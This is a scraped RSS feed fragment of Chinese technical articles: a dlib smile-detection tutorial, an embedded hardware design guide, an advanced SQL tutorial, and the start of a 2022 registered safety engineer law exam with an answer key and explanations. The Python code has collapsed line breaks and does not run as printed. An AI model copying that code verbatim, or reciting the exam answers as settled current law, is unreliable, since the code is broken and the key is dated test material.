from PIL import Image, ImageDraw, ImageFont
import dlib
2.定义
MAR
函数：
函数计算嘴巴张开的程度（MAR），通过计算嘴巴周围特定点之间的距离。
def MAR(shape):A = euclidean_distances(shape[50].reshape(1, 2), shape[58].reshape(1, 2))B = euclidean_distances(shape[51].reshape(1, 2), shape[57].reshape(1, 2))C = euclidean_distances(shape[52].reshape(1, 2), shape[56].reshape(1, 2))D = euclidean_distances(shape[48].reshape(1, 2), shape[54].reshape(1, 2))return ((A + B + C) / 3) / D
3.定义
MJR
函数：
函数计算嘴巴宽度与脸部宽度的比例（MJR），用于判断微笑的程度。
def MJR(shape):m = euclidean_distances(shape[48].reshape(1, 2), shape[54].reshape(1, 2))j = euclidean_distances(shape[3].reshape(1, 2), shape[13].reshape(1, 2))return m / j
4.定义
cv2addchinese
函数：
检查图像类型并转换：
def cv2addchinese(img, text, position, textColor=255, textSize=30):if isinstance(img, np.ndarray):if len(img.shape) == 2:  # 灰度图像img_pil = Image.fromarray(img)else:  # 彩色图像img_pil = Image.fromarray(cv2.cvtColor(img, cv2.COLOR_BGR2RGB))else:raise ValueError("img must be a numpy array")
创建了一个
ImageDraw
对象用于在PIL图像上绘制，加载了一个中文字体文件，在指定位置绘制文本。
draw = ImageDraw.Draw(img_pil)fontstyle = ImageFont.truetype("simsun.ttc", textSize, encoding="utf-8")draw.text(position, text, font=fontstyle, fill=textColor)
将PIL图像转换回OpenCV图像，如果原图像是灰度图，直接转换即可；如果是彩色图，则需要从RGB色彩空间转换回BGR色彩空间。
if len(img.shape) == 2:  # 灰度图像img_cv2 = np.array(img_pil, dtype=np.uint8)else:  # 彩色图像img_cv2 = cv2.cvtColor(np.array(img_pil), cv2.COLOR_RGB2BGR)return img_cv2
5.初始化人脸检测器和特征点预测器：
detector = dlib.get_frontal_face_detector()
predictor = dlib.shape_predictor("shape_predictor_68_face_landmarks.dat")
cap = cv2.VideoCapture('xiao.mp4')
6.读取视频帧并检测人脸：
while True:ret, image = cap.read()faces = detector(image, 0)for face in faces:#获取特征点shape = predictor(image, face)#将 predictor 返回的特征点横坐标与纵坐标转换为NumPy数组shape = np.array([[p.x, p.y] for p in shape.parts()])
7.计算表情指标并绘制结果：
根据MAR和MJR的值来判断表情类型
mar = MAR(shape)mjr = MJR(shape)result = '正常'print("mar", mar, "\tmjr", mjr)if mar &gt; 0.5:result = "大笑"elif mjr &gt; 0.45:result = "微笑"#计算嘴巴的凸包mouth = cv2.convexHull(shape[48:61])#在图像上添加表情文本image = cv2addchinese(image, result, mouth[0,0])#绘制嘴巴轮廓cv2.drawContours(image, [mouth], -1, (0, 255, 0), 1)cv2.imshow('frame', image)key = cv2.waitKey(60)if key == 27:break
运行结果
完整代码
import numpy as np
import cv2
from sklearn.metrics.pairwise import euclidean_distances
from PIL import Image, ImageDraw, ImageFont
import dlibdef MAR(shape):A = euclidean_distances(shape[50].reshape(1, 2), shape[58].reshape(1, 2))B = euclidean_distances(shape[51].reshape(1, 2), shape[57].reshape(1, 2))C = euclidean_distances(shape[52].reshape(1, 2), shape[56].reshape(1, 2))D = euclidean_distances(shape[48].reshape(1, 2), shape[54].reshape(1, 2))return ((A + B + C) / 3) / Ddef MJR(shape):m = euclidean_distances(shape[48].reshape(1, 2), shape[54].reshape(1, 2))j = euclidean_distances(shape[3].reshape(1, 2), shape[13].reshape(1, 2))return m / jdef cv2addchinese(img, text, position, textColor=255, textSize=30):if isinstance(img, np.ndarray):if len(img.shape) == 2:  # 灰度图像img_pil = Image.fromarray(img)else:  # 彩色图像img_pil = Image.fromarray(cv2.cvtColor(img, cv2.COLOR_BGR2RGB))else:raise ValueError("img must be a numpy array")draw = ImageDraw.Draw(img_pil)fontstyle = ImageFont.truetype("simsun.ttc", textSize, encoding="utf-8")draw.text(position, text, font=fontstyle, fill=textColor)# 将PIL图像转换回OpenCV图像if len(img.shape) == 2:  # 灰度图像img_cv2 = np.array(img_pil, dtype=np.uint8)else:  # 彩色图像img_cv2 = cv2.cvtColor(np.array(img_pil), cv2.COLOR_RGB2BGR)return img_cv2detector = dlib.get_frontal_face_detector()
predictor = dlib.shape_predictor("shape_predictor_68_face_landmarks.dat")
cap = cv2.VideoCapture('xiao.mp4')while True:ret, image = cap.read()faces = detector(image, 0)for face in faces:shape = predictor(image, face)shape = np.array([[p.x, p.y] for p in shape.parts()])mar = MAR(shape)mjr = MJR(shape)result = '正常'print("mar", mar, "\tmjr", mjr)if mar &gt; 0.5:result = "大笑"elif mjr &gt; 0.45:result = "微笑"mouth = cv2.convexHull(shape[48:61])image = cv2addchinese(image, result, mouth[0,0])cv2.drawContours(image, [mouth], -1, (0, 255, 0), 1)cv2.imshow('frame', image)key = cv2.waitKey(60)if key == 27:break
改进方法：
提高特征点预测的稳定性
：考虑使用更先进的特征点预测模型。
优化表情识别算法
：使用深度学习模型来提高表情识别的准确性。
改进阈值设置
：根据实际应用场景调整MAR和MJR的阈值，以提高识别准确率。
增强系统的鲁棒性
：通过算法优化，提高系统在不同光照和表情变化下的鲁棒性。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540082.html</guid><pubDate>Fri, 31 Oct 2025 07:23:27 +0000</pubDate></item><item><title>嵌入式硬件设计详解</title><link>https://www.ppmy.cn/news/1540083.html</link><description>嵌入式硬件设计详解
嵌入式硬件设计是一个复杂而精细的过程，它涉及将微控制器（MCU）、微处理器（MPU）或数字信号处理器（DSP）等核心芯片与其他外围电子元件（如传感器、执行器、存储器、电源管理芯片等）进行组合和连接，构建成一个完整的、可独立运行的嵌入式系统硬件平台。这个硬件平台将运行特定的软件，以实现诸如工业控制、智能家居、汽车电子、消费电子等各种应用领域中的特定功能。以下是对嵌入式硬件设计的详细探讨。
一、需求分析
在进行嵌入式硬件设计之前，首先需要进行需求分析，明确系统的功能需求、性能要求、工作环境、成本限制等。例如，对于一个工业温度控制系统，需要确定测量的温度范围、精度要求、响应时间、是否需要远程监控等需求。这些需求将直接影响后续的核心元件选择、原理图设计、PCB设计等步骤。
二、核心元件选择
微控制器（MCU）/微处理器（MPU）/数字信号处理器（DSP）
处理能力
：根据应用需求确定芯片的处理速度，一般用时钟频率衡量。例如，对于一些简单的LED控制应用，较低时钟频率（如8MHz）的MCU可能就足够；而对于复杂的图像识别应用，可能需要较高时钟频率（如几百MHz甚至GHz）的MPU或DSP。
内存资源
：包括程序存储器（ROM/Flash）和数据存储器（RAM）的容量。如果应用程序较大且需要处理大量数据，就需要较大的内存容量。例如，一个运行复杂算法且需要存储大量中间数据的嵌入式系统可能需要数MB的Flash和几百KB的RAM。
I/O接口数量和类型
：不同的应用需要不同类型和数量的I/O接口。如一个智能家居控制系统可能需要多个通用I/O接口来连接传感器和执行器，还可能需要特定的接口如SPI、I2C接口来连接其他芯片。
功耗
：在一些电池供电的嵌入式设备（如可穿戴设备）中，低功耗是关键要求。选择具有低功耗模式（如睡眠模式、待机模式等）且在正常工作时功耗较低的芯片。
成本
：对于大规模生产的嵌入式产品（如消费电子中的智能手环），成本是重要的考虑因素。选择性价比高的芯片，在满足性能需求的前提下尽量降低成本。
传感器
类型
：根据应用确定需要测量的物理量，如温度、湿度、压力、加速度等，然后选择相应类型的传感器。例如，对于环境监测系统，需要选择温度传感器（如DS18B20）、湿度传感器（如DHT11）等。
精度和测量范围
：传感器的精度和测量范围必须满足应用需求。例如，在高精度的工业温度控制中，可能需要精度达到±0.1°C、测量范围较宽（如-50°C~+150°C）的温度传感器。
接口类型
：传感器的接口类型要与所选的核心芯片兼容。常见的接口类型有模拟接口（如电压输出型、电流输出型）和数字接口（如SPI、I2C、UART等）。
执行器
类型
：根据系统要实现的动作选择执行器。例如，在电机控制系统中，需要选择合适的电机（如直流电机、步进电机等）和电机驱动器；在灯光控制系统中，需要选择合适的灯光驱动器（如LED驱动器）。
参数
：执行器的功率、扭矩（对于电机类执行器）、亮度（对于灯光类执行器）等参数要满足应用需求。例如，对于一个需要带动较大负载的机器人关节驱动，需要选择扭矩较大的步进电机。
控制方式
：执行器的控制方式要与核心芯片相匹配。例如，某些电机可以通过PWM（脉冲宽度调制）信号控制转速，那么所选的MCU就需要有足够的PWM输出接口来实现这种控制方式。
电源管理
电源类型
：根据系统的功耗、输入电源类型（如市电、电池等）和电压要求选择合适的电源类型。例如，对于低功耗的嵌入式系统可以采用线性稳压电源；对于功耗较大且对效率要求较高的系统，可以采用开关电源。
电压转换
：如果系统中有不同电压需求的元件，需要进行电压转换。例如，将输入的5V电源转换为3.3V供给MCU使用。可以使用电压转换芯片（如LM1117等）实现稳压和电压转换功能，确保各元件获得稳定的工作电压。
三、原理图设计
在选择了核心元件之后，接下来需要进行原理图设计。原理图设计是绘制电路原理图，确定各个元件之间的连接关系，包括电源电路、复位电路、时钟电路、输入/输出接口（I/O接口）与外围设备的连接等。
电源电路
供电电路
：确保系统稳定供电，包括电池、电源适配器和稳压器。在电源电路中加入滤波电容和去耦电容，以减少电源中的噪声和干扰。一般在电源输入端和每个芯片的电源引脚附近都要放置合适的电容。例如，在电源输入端放置一个大容量的电解电容（如100μF）用于滤波，在芯片电源引脚附近放置一个小容量的陶瓷电容（如0.1μF）用于去耦。
复位电路
上电复位和手动复位
：有上电复位和手动复位两种基本类型。上电复位是在系统上电时将芯片复位到初始状态；手动复位则是通过外部按钮操作使芯片复位。对于简单的MCU系统，上电复位电路可以由一个电容和一个电阻组成。例如，在MCU的复位引脚连接一个10μF的电容到地，再串联一个10kΩ的电阻到电源，当系统上电时，电容充电过程会使复位引脚保持一段时间的低电平，实现上电复位功能。手动复位则可以通过在复位引脚连接一个按钮，按下按钮时将复位引脚拉低实现复位。
时钟电路
内部时钟源和外部时钟源
：可以选择内部时钟源或外部时钟源。内部时钟源一般是芯片内部自带的振荡器，其精度相对较低；外部时钟源（如晶振）精度较高。在对时钟精度要求较高的应用（如通信系统）中，通常选择外部晶振作为时钟源。如果使用外部晶振，需要正确连接到芯片的时钟输入引脚。例如，对于一个MCU，将晶振的两端分别连接到芯片的XTAL1和XTAL2引脚，同时可能需要在晶振两端连接一些起振电容（如22pF的陶瓷电容），以帮助晶振正常起振。
I/O接口电路
电平兼容性
：对于数字I/O接口，需要考虑其电平兼容性、驱动能力等。例如，当MCU的I/O接口要与另一个芯片的I/O接口直接连接时，要确保两者的电平标准一致（如都是3.3V电平），如果电平不兼容，可能需要进行电平转换。
驱动能力
：MCU的I/O接口的驱动能力有限，如果要连接多个负载（如多个LED），可能需要增加外部驱动电路（如三极管驱动电路或缓冲器芯片）。
模拟信号接口电路
信号调理
：在涉及模拟信号输入或输出的接口电路中，需要进行信号调理。例如，对于模拟输入接口，如果输入的模拟信号幅度不符合芯片的要求，可能需要进行放大或衰减处理；对于模拟输出接口，如果要驱动外部的模拟设备（如扬声器），可能需要进行功率放大等操作。
四、PCB设计
原理图设计完成后，接下来需要将原理图转化为PCB（印制电路板）版图。PCB设计需要考虑布线规则（如线宽、间距等）、电磁兼容性（EMC）、信号完整性、电源完整性等因素。
布线规则
线宽
：根据电路中的电流大小确定线宽。一般来说，电流越大，线宽应越宽，以确保线路不会因为过热而损坏。例如，对于承载1A电流的线路，线宽可能需要1~2mm；对于小电流（如几十毫安）的线路，线宽可以相对较窄（如0.2~0.3mm）。
线间距
：为了防止线路之间发生短路和电磁干扰，需要设置合适的线间距。一般情况下，线间距应不小于一定的值（如0.2mm），在高压电路或对绝缘要求较高的电路中，线间距应更大。
信号完整性
布线方向
：在高速数字电路中，布线方向对信号完整性有很大影响。尽量避免直角布线，采用45°或圆弧布线，以减少信号反射。
差分信号
：对于差分信号（如USB、以太网等中的差分对），要保证差分对的布线长度相等、间距相等，以提高信号传输质量。
电磁兼容性（EMC）
屏蔽措施
：对于容易受到外界电磁干扰的电路部分或本身会产生电磁干扰的元件（如高频时钟电路、射频电路等），可以采用屏蔽措施。
五、硬件调试
对制作好的硬件进行调试，检查电路是否正常工作，包括电源是否正常、芯片是否能够正常复位、I/O接口是否能正常输入输出等，使用示波器、万用表等工具进行测试。
电源测试
：检查电源电路是否正常工作，确保各元件获得稳定的工作电压。
复位测试
：检查复位电路是否正常工作，确保系统上电时芯片能够复位到初始状态。
I/O接口测试
：检查I/O接口是否能正常输入输出，确保与外部设备的连接正常。
功能测试
：根据系统设计的功能需求，进行功能测试，确保系统能够实现预期的功能。
六、优化与迭代
在完成初步硬件调试后，可能会发现一些设计上的不足或性能瓶颈。这时，就需要进行优化与迭代，以提高系统的稳定性和性能。
性能优化
时钟频率调整
：如果系统在某些应用场景下处理速度不够快，可以考虑提高MCU的时钟频率。但需要注意的是，提高时钟频率可能会增加功耗和发热量，因此需要在性能、功耗和发热量之间找到平衡点。
算法优化
：对于运行复杂算法的系统，可以通过优化算法来减少计算量，从而提高处理速度。例如，使用更高效的数学库、减少不必要的浮点运算等。
并行处理
：如果系统需要处理的任务较多，可以考虑采用并行处理技术，如使用多核MCU、DSP或FPGA等，将任务分配给多个处理器同时处理。
功耗优化
低功耗模式
：充分利用MCU的低功耗模式（如睡眠模式、待机模式等），在不需要处理任务时降低功耗。
电源管理
：通过电源管理芯片或软件控制，实现电源的按需分配和动态调整，减少不必要的功耗。
元件选择
：选择低功耗的元件，如低功耗的传感器、执行器等，从源头上降低功耗。
可靠性优化
冗余设计
：对于关键电路或元件，可以采用冗余设计，如双电源供电、双MCU备份等，以提高系统的可靠性。
热设计
：合理布局和散热设计，确保系统在高负载下不会过热而导致性能下降或损坏。
EMC设计
：加强电磁兼容性设计，如增加屏蔽层、优化布线等，以减少外界电磁干扰对系统的影响。
迭代设计
用户反馈
：收集用户反馈，了解系统在实际应用中的表现和问题，作为后续迭代设计的依据。
技术更新
：关注行业动态和技术发展，及时将新技术、新元件应用到系统中，提高系统的性能和竞争力。
成本优化
：在保证性能和可靠性的前提下，通过优化设计、选择性价比更高的元件等方式降低成本，提高产品的市场竞争力。
七、总结与展望
嵌入式硬件设计是一个复杂而精细的过程，涉及需求分析、核心元件选择、原理图设计、PCB设计、硬件调试以及优化与迭代等多个环节。通过科学的设计方法和严谨的测试流程，可以设计出性能稳定、功耗低、可靠性高的嵌入式系统硬件平台。
未来，随着物联网、人工智能、5G等技术的不断发展，嵌入式系统将在更多领域得到应用。因此，嵌入式硬件设计也需要不断创新和进步，以适应新的应用需求和技术挑战。例如，在物联网应用中，需要设计低功耗、高可靠性的无线通信模块；在人工智能应用中，需要设计高性能、低功耗的神经网络加速器；在5G应用中，需要设计高速、低延迟的数据处理电路等。
总之，嵌入式硬件设计是一个充满挑战和机遇的领域。只有不断学习和探索新的技术和方法，才能设计出更加优秀的嵌入式系统硬件平台，为人们的生活和工作带来更多的便利和价值。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540083.html</guid><pubDate>Fri, 31 Oct 2025 07:23:30 +0000</pubDate></item><item><title>提升SQL技能，掌握数据分析</title><link>https://www.ppmy.cn/news/1540084.html</link><description>提升SQL技能，掌握数据分析
在今天这个数据驱动的世界，掌握SQL（结构化查询语言）不仅是一项技术能力，更是一种职业竞争力。想象一下，如果你能像魔法师一样轻松从庞大且复杂的数据集中提取出有用的信息，直观呈现给团队和管理层，那你就不仅是在做数据分析，更是在为决策提供支持。那么，如何能掌握更高级的SQL技巧呢？接下来，让我们一同探索一些提升数据分析能力的关键技巧。
常见表表达式（CTEs）
CTE的定义与用途
常见表表达式（CTEs）是给复杂查询提供结构的一种方式。你可以把CTE想成是在撰写一篇研究论文时使用的小章节，它们帮助你清楚地组织思路和逻辑。通过CTE，你可以创建临时表，使得查询的逻辑结构更为清晰。例如：
WITH
toronto_ppl
AS
(
SELECT
DISTINCT
name
FROM
population
WHERE
country
=
'Canada'
AND
city
=
'Toronto'
)
,
avg_female_salary
AS
(
SELECT
AVG
(
salary
)
AS
avgSalary
FROM
salaries
WHERE
gender
=
'Female'
)
SELECT
name
,
salary
FROM
People
WHERE
name
IN
(
SELECT
DISTINCT
name
FROM
toronto_ppl
)
AND
salary
&gt;=
(
SELECT
avgSalary
FROM
avg_female_salary
)
;
在这个例子中，CTE不仅让查询更简约易懂，还显著提高了数据提取的效率。这是一项基础技能，但却是扶持高级SQL能力的关键基础。你也许会好奇，为什么我们不直接写长查询呢？答案简单且直接：长查询往往导致可读性差、难以维护！来源
示例：使用CTE简化复杂查询
使用CTE的另一个明显好处是，它能将复杂的查询简化为更易管理的模块。想象一下，在满是错综复杂的子查询时，你是否有过审视挫败感？例如，下面的查询使用多个子查询：
SELECT
Sales_Manager
,
Product_Category
,
UnitPrice
FROM
Dummy_Sales_Data_v1
WHERE
Sales_Manager
IN
(
SELECT
DISTINCT
Sales_Manager
FROM
Dummy_Sales_Data_v1
WHERE
Shipping_Address
=
'Germany'
AND
UnitPrice
&gt;
150
)
AND
Product_Category
IN
(
SELECT
DISTINCT
Product_Category
FROM
Dummy_Sales_Data_v1
WHERE
Product_Category
=
'Healthcare'
AND
UnitPrice
&gt;
150
)
ORDER
BY
UnitPrice
DESC
;
你是否能够立刻找出这样的查询中的所有关键要素？使用CTE，我们可以将此查询改写为：
WITH
SM
AS
(
SELECT
DISTINCT
Sales_Manager
FROM
Dummy_Sales_Data_v1
WHERE
Shipping_Address
=
'Germany'
AND
UnitPrice
&gt;
150
)
,
PC
AS
(
SELECT
DISTINCT
Product_Category
FROM
Dummy_Sales_Data_v1
WHERE
Product_Category
=
'Healthcare'
AND
UnitPrice
&gt;
150
)
SELECT
Sales_Manager
,
Product_Category
,
UnitPrice
FROM
Dummy_Sales_Data_v1
WHERE
Product_Category
IN
(
SELECT
Product_Category
FROM
PC
)
AND
Sales_Manager
IN
(
SELECT
Sales_Manager
FROM
SM
)
ORDER
BY
UnitPrice
DESC
;
这样重构的查询不仅能提高你在查询时的清晰度，还便于维护与更新。来源
递归CTE的应用
你是否处理过分层结构数据？例如，组织架构图的层级关系。递归CTE是处理此类数据时的强大工具。通过构建“锚构件”和“递归成员”，你能深入了解层级关系。例如：
WITH
org_structure
AS
(
SELECT
id
,
manager_id
FROM
staff_members
WHERE
manager_id
IS
NULL
UNION
ALL
SELECT
sm
.
id
,
sm
.
manager_id
FROM
staff_members sm
JOIN
org_structure os
ON
os
.
id
=
sm
.
manager_id
)
SELECT
*
FROM
org_structure
;
这个查询自动将每个员工的层级关系建立起来。正因为有了递归的能力，CTE在复杂数据结构提供了巨大的灵活性和可读性。来源
窗口函数与排名
ROW_NUMBER()、RANK()与DENSE_RANK()
你千万不要小看这些排名工具，它们能够令你的数据分析过程如虎添翼！当需要为行赋予排名时，我们会用到
ROW_NUMBER()
、
RANK()
和
DENSE_RANK()
。你是否曾经因为重复值而陷入困境？这三者的区别恰好可以在这时为你提供解决思路。
SELECT
Name
,
GPA
,
ROW_NUMBER
(
)
OVER
(
ORDER
BY
GPA
DESC
)
AS
RowNum
,
RANK
(
)
OVER
(
ORDER
BY
GPA
DESC
)
AS
RankNum
,
DENSE_RANK
(
)
OVER
(
ORDER
BY
GPA
DESC
)
AS
DenseRankNum
FROM
student_grades
;
在上述代码中，
ROW_NUMBER()
为每一行赋予唯一的编号，而
RANK()
和
DENSE_RANK()
则处理重复值的方式不同，你会发现它们在多种情况下能各司其职。假如你在创建竞争分析时，选择使用错误的排名工具，可能会错估潜在客户的价值。来源
计算Delta值与运行总和
利用 LAG() 和 LEAD() 函数，我们可以对不同时期的字段值进行比较。例如：
SELECT
month
,
sales
,
sales
-
LAG
(
sales
,
1
)
OVER
(
ORDER
BY
month
)
AS
delta_sales
FROM
monthly_sales
;
这样我们便能轻松比较本月和上月的销售数据。运行总和的计算更是可以通过结合窗口函数和 SUM() 来达成，例如：
SELECT
Month
,
Revenue
,
SUM
(
Revenue
)
OVER
(
ORDER
BY
Month
)
AS
Cumulative
FROM
monthly_revenue
;
想象一下，你能快速获取到每个月的累计收入，这在制定策略时可提供强大的支持！来源
其他窗口函数的实用示例
窗口函数不仅能提高你的数据分析能力，它们还有助于识别销售趋势。例如，通过分析每个产品的销售数据，你可以轻松了解哪些产品在特定季节的表现更好，从而在库存管理和推广策略上做出更为明智的决策。这种强大的工具使得你的数据不仅仅是数字，更是问题解决的钥匙。来源
数据操作技巧
使用CASE WHEN语句
想要实现复杂的条件逻辑，
CASE WHEN
语句就是你的最佳朋友。它不仅能用来实现复杂的数据分类，还能在数据透视时提供灵活的聚合选择。例如：
SELECT
Sales_Manager
,
COUNT
(
CASE
WHEN
Shipping_Address
=
'Singapore'
THEN
OrderID
END
)
AS
Singapore_Orders
,
COUNT
(
CASE
WHEN
Shipping_Address
=
'UK'
THEN
OrderID
END
)
AS
UK_Orders
FROM
Dummy_Sales_Data_v1
GROUP
BY
Sales_Manager
;
想象一下，当你需要对不同市场的销售表现作出直观对比时，有了这种灵活的语句，数据不再局限于冷冰冰的数字，而是变得生动鲜明。来源
EXCEPT与NOT IN的区别
在比较两个数据集时，
EXCEPT
和
NOT IN
都是不二之选，但它们的应用场景却各有千秋。
EXCEPT
去掉重复值并返回不同的行，而
NOT IN
则会检查某个值是否存在于另一个查询集中。这两者的灵活运用能够让你的查询更加精准和高效。来源
自联结的实现
自联结则能够帮助你在同一表中进行比较，比如查找那些工资高于直接管理者的员工。想象一下，这不仅是对数据库操作技巧的考量，更是在挑战你的逻辑思维：
SELECT
a
.
Name
AS
Employee
FROM
Employee a
JOIN
Employee b
ON
a
.
ManagerId
=
b
.
Id
WHERE
a
.
Salary
&gt;
b
.
Salary
;
通过这种直观的自联结运算，便能快速识别潜在的值得关注的职员，帮助管理层更好地决策。来源
结论
掌握高级 SQL 技巧不仅能帮助你提升数据分析能力，更能在日后工作中迅速、准确地提取出有价值的信息。正如我们所探索的，从 CTE 到窗口函数，你的每一个选择都可能影响最终的数据结论。你有没有想过：在你当前的工作环境中，如何应用这些技巧来创造更多的价值？又或者有没有你希望尝试的新功能呢？记住，科技在不断进步，掌握新技能永远是保持竞争力的最佳方式。探索、学习并应用这些技巧，你将会在数据分析的旅程中走得更远。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540084.html</guid><pubDate>Fri, 31 Oct 2025 07:23:32 +0000</pubDate></item><item><title>中级注册安全工程师《安全生产法律法规》真题及详解</title><link>https://www.ppmy.cn/news/1540085.html</link><description>2022年中级注册安全工程师《安全生产法律法规》真题及详解
一、单项选择题 （共70题，每题1分。每题的备选项中，只有1个最符合题意）
1. 法律的制定主体不同，其法律地位和法律效力也不同。关于法律地位和效力的说法，正确的是（ ）。
A. 北京市人民政府制定的《北京市生产经营单位安全生产主体责任规定》的法律地位等同于应急管理部制定的《生产安全事故应急预案管理办法》
B. 《河南省安全生产条例》的法律效力高于北京市人民政府制定的《北京市生产经营单位安全生产主体责任规定》
C. 《河南省安全生产条例》的法律地位高于《危险化学品安全管理条例》
D. 《危险化学品安全管理条例》的法律效力高于应急管理部制定的《生产安全事故应急预案管理办法》
【答案】 D
【解析】
A项，《北京市生产经营单位安全生产主体责任规定》属于地方政府规章，《生产安全事故应急预案管理办法》属于部门规章，法律规定，
部门规章的法律效力层级高于地方政府规章
。
B项，《河南省安全生产条例》属于河南省的地方性法规，而《北京市生产经营单位安全生产主体责任规定》属于北京市的地方政府规章，不属于同一管辖范畴，
不能作比较
。
C项，《河南省安全生产条例》的法律地位
“低于”
《危险化学品安全管理条例》。
D项，《危险化学品安全管理条例》属于国务院制定的行政法规，《生产安全事故应急预案管理办法》属于应急管理部制定的部门规章，行政法规的法律效力层级高于部门规章。
2. 甲是某煤业公司采煤机操作人员，工龄超过20年。乙、丙是该公司新招录人员，从事井下作业，其中丙毕业于煤炭职业院校。某日，因甲操作不当造成事故致1人死亡。调查发现，该煤业公司员工安全生产教育和培训工作不到位，根据《安全生产法》《安全生产培训管理办法》，关于安全生产教育和培训说法正确的是（ ）。
A. 该煤业公司主要负责人应当重新参加安全培训
B. 甲根据工作经历可以不重新参加安全培训
C. 乙在完成规定的安全培训后可以独立上岗作业
D. 丙可以免予参加初次培训及实际操作培训
【答案】 A
【解析】
B项，根据《安全生产培训管理办法》第十二条规定，特种作业人员对造成人员死亡的生产安全事故负有直接责任的，应当按照《特种作业人员安全技术培训考核管理规定》
重新参加安全培训
。
C项，根据《安全生产培训管理办法》第十三条规定，国家鼓励生产经营单位实行师傅带徒弟制度。矿山新招的井下作业人员和危险物品生产经营单位新招的危险工艺操作岗位人员，除按照规定进行安全培训外，
还应当在有经验的职工带领下实习满2个月后
，方可独立上岗作业。
D项，根据《安全生产培训管理办法》第十四条规定，国家鼓励生产经营单位招录职业院校毕业生。职业院校毕业生从事与所学专业相关的作业，可以免予参加初次培训，
实际操作培训除外
。
3. 2022年某饮料生产企业发生一起重大生产安全事故。经调查，该企业未履行安全生产管理职责，其2020年和2021年的年收入分别为60万元和70万元。根据《安全生产法》，应急管理部门应当对该主要负责人处以罚款（ ）。
A. 36万元
B. 48万元
C. 52万元
D. 56万元
【答案】 D
【解析】
根据《安全生产法》第九十五条规定，生产经营单位的主要负责人未履行本法规定的安全生产管理职责，导致发生生产安全事故的，由应急管理部门依照下列规定处以罚款：①发生一般事故的，处上一年年收入百分之四十的罚款；②发生较大事故的，处上一年年收入百分之六十的罚款；③发生重大事故的，处上一年年收入百分之八十的罚款；④发生特别重大事故的，处上一年年收入百分之一百的罚款。本题中，70×0.8＝
56（万）
。
4. 根据《安全生产法》，下列职责中，属于生产经营单位安全生产管理人员职责的是（ ）。
A. 组织制定本单位安全风险分级管控制度
B. 组织实施本单位安全生产教育和培训计划
C. 组织实施本单位的生产安全事故应急救援预案
D. 督促落实本单位重大危险源的安全管理措施
【答案】 D
【解析】
根据《安全生产法》第二十五条规定，生产经营单位的安全生产管理机构以及安全生产管理人员履行下列职责：①组织或者参与拟订本单位安全生产规章制度、操作规程和生产安全事故应急救援预案；②组织或者参与本单位安全生产教育和培训，如实记录安全生产教育和培训情况；③组织开展危险源辨识和评估，
督促落实本单位重大危险源的安全管理措施
；④组织或者参与本单位应急救援演练；⑤检查本单位的安全生产状况，及时排查生产安全事故隐患，提出改进安全生产管理的建议；⑥制止和纠正违章指挥、强令冒险作业、违反操作规程的行为；⑦督促落实本单位安全生产整改措施。
5. 安全生产责任保险是保险机构对投保的生产经营单位发生生产安全事故造成的人员伤亡和有关经济损失等予以赔偿的保险，根据《安全生产法》及相关规定，下列有关安全生产责任保险的说法，正确的是（ ）。
A. 承保机构应当为生产经营单位提供生产安全事故预防技术服务
B. 生产经营单位应当投保安全生产责任保险
C. 安全生产责任保险属于生产经营单位投保的社会保险
D. 安全生产责任保险的被保险人是生产经营单位的从业人员
【答案】 A
【解析】
A项，深入推动落实《安全生产责任保险事故预防技术服务规范》（AQ 9010—2019），通过实施安责险，加快建立保险机构和专业技术服务机构等广泛参与的安全生产社会化服务体系。
B项，
不是所有的单位都必须要求投保安全生产责任险
，煤矿、非煤矿山、危险化学品、烟花爆竹、交通运输、建筑施工、民用爆炸物品、金属冶炼、渔业生产等高危行业领域的生产经营单位应当投保安全生产责任保险。对于上述行业之外的其他生产经营单位，国家鼓励其投保安全生产责任保险。
C项，对于高危企业，安全生产责任保险就是
属于强制保险
，安全生产责任保险，是指保险机构对投保的生产经营单位发生的生产安全事故造成的人员伤亡和有关经济损失等予以赔偿，并且为投保的生产经营单位提供生产安全事故预防服务的商业保险。
D项，安全生产责任险保障范围
不仅包括企业从业人员
，还包括第三者的人员伤亡和财产损失，以及相关救援救护、事故鉴定和法律诉讼等费用。
6. 负有安全生产监督管理职责的部门依照有关法律、法规的规定，对涉及安全生产的事项需要审查批准或者验收的，必须严格依照有关法律、法规，国家标准或行业标准规定的安全生产条件和程序进行。根据《安全生产法》规定，负有安全生产监督管理职责的部门行使行政许可审批职权的说法，正确的是（ ）。
A. 对设计安全生产的事项进行审查、验收时，应当公示收费标准
B. 为保障安全，有权要求接受审查、验收的单位使用指定的品牌的安全设施
C. 对已依法取得批准但不再具备安全生产条件的单位，应当撤销原批准
D. 对未依法取得批准的单位，应当立即予以取消并处以罚款
【答案】 C
【解析】
A项，负有安全生产监督管理职责的部门对涉及安全生产的事项进行审查、验收，不得收取费用。
B项，不得要求接受审查、验收的单位购买其指定品牌或者指定生产、销售单位的安全设备、器材或者其他产品。
C项，对已经依法取得批准的单位，负责行政审批的部门发现其
不再具备安全生产条件的
，
应当撤销原批准
。
D项，对未依法取得批准或者验收合格的单位擅自从事有关活动的，负责行政审批的部门发现或者接到举报后应当立即予以取缔，并依法予以处理。
7. 根据《民用爆炸品安全管理条例》，关于民用爆炸物品企业设立及生产的说法、正确的是（ ）。
A. 因调整生产能力进行改建的，应当申请办理《民用爆炸物品生产许可证》
B. 申请从事民用爆炸物品生产的企业应当符合地方产业结构规划
C. 应当向当地民用爆炸物品行业主管部门提交企业设立申请
D. 依法取得《民用爆炸物品生产许可证》并完成基本建设后，可以生产民用爆炸物品
【答案】 A
【解析】
A项，民用爆炸物品生产企业为调整生产能力及品种进行改建、扩建的，
应当申请办理《民用爆炸物品生产许可证》
。
B项，申请从事民用爆炸物品生产的企业，应当具备下列条件：申请从事民用爆炸物品生产的企业，应当具备下列条件：①符合国家产业结构规划和产业技术标准；②厂房和专用仓库的设计、结构、建筑材料、安全距离以及防火、防爆、防雷、防静电等安全设备、设施符合国家有关标准和规范；③生产设备、工艺符合有关安全生产的技术标准和规程；④有具备相应资格的专业技术人员、安全生产管理人员和生产岗位人员；⑤有健全的安全管理制度、岗位安全责任制度；⑥法律、行政法规规定的其他条件。
C项，申请从事民用爆炸物品生产的企业，应当向国务院民用爆炸物品行业主管部门提交申请书、可行性研究报告以及能够证明其符合依据《民用爆炸物品安全管理条例》第十一条规定条件的有关材料。
D项，民用爆炸物品生产企业取得《民用爆炸物品安全生产许可证》后，方可生产民用爆炸物品。
